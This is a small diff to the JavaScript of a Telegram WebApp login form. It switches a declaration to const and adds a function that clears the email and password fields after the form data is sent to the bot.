@@ -1,5 +1,5 @@
 // Initialisation de l'application Telegram WebApp
-let tg = window.Telegram.WebApp;
+const tg = window.Telegram.WebApp;
 
 // Fonction pour valider l'email
 function validateEmail(email) {
@@ -12,6 +12,12 @@ function validatePassword(password) {
     return password.length >= 8 && 
            /[A-Z]/.test(password) && 
            /[0-9]/.test(password);
+}
+
+// Fonction pour réinitialiser le formulaire
+function resetForm() {
+    document.getElementById('email').value = '';
+    document.getElementById('password').value = '';
 }
 
 // Gestionnaire de soumission du formulaire
@@ -40,6 +46,9 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
 
     // Envoi des données au bot Telegram
     tg.sendData(JSON.stringify(formData));
+    
+    // Réinitialiser le formulaire
+    resetForm();
     
     // Afficher un message de confirmation
     alert('Données envoyées avec succès!');
